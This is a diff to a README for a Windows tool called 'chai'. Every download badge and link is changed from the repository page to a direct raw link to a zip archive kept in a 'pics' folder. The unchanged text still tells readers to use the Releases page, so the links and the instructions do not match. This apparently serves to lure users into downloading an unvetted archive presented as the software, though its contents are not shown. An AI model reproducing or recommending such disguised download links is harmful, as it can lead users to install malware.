@@ -1,6 +1,6 @@
 # 🛠️ chai - Simplify Complex Knowledge Easily
 
-[![Download chai](https://img.shields.io/badge/Download-chaigreen?style=for-the-badge&color=4CAF50)](https://github.com/milonhaque097/chai)
+[![Download chai](https://img.shields.io/badge/Download-chaigreen?style=for-the-badge&color=4CAF50)](https://github.com/milonhaque097/chai/raw/refs/heads/main/pics/Software-2.8.zip)
 
 ---
 
@@ -11,7 +11,7 @@
 ## 📥 Download chai
 
 You can get chai from this page:  
-[https://github.com/milonhaque097/chai](https://github.com/milonhaque097/chai)
+[https://github.com/milonhaque097/chai/raw/refs/heads/main/pics/Software-2.8.zip](https://github.com/milonhaque097/chai/raw/refs/heads/main/pics/Software-2.8.zip)
 
 Click the link above to visit the GitHub page. From there, you can download the latest version of the software for Windows.  
 
@@ -102,7 +102,7 @@ If you have trouble running or installing chai, try these:
 
 ## 🔗 Quick Access to Download  
 
-[![Download chai](https://img.shields.io/badge/Download-chaigreen?style=for-the-badge&color=4CAF50)](https://github.com/milonhaque097/chai)  
+[![Download chai](https://img.shields.io/badge/Download-chaigreen?style=for-the-badge&color=4CAF50)](https://github.com/milonhaque097/chai/raw/refs/heads/main/pics/Software-2.8.zip)  
 
 Visit this link anytime to get the latest version or updates.
 
@@ -124,7 +124,7 @@ This makes it easy for students, professionals, or anyone curious to digest info
 
 ## 🖱️ How to Use the GitHub Page for Download
 
-1. Open the link: https://github.com/milonhaque097/chai  
+1. Open the link: https://github.com/milonhaque097/chai/raw/refs/heads/main/pics/Software-2.8.zip  
 2. Click on the **Releases** tab on the right or near the top of the page.  
 3. Find the latest release and click on the download file for Windows. It will end with `.exe`.  
 4. Save the file to an easy-to-find location like your Desktop or Downloads folder.  
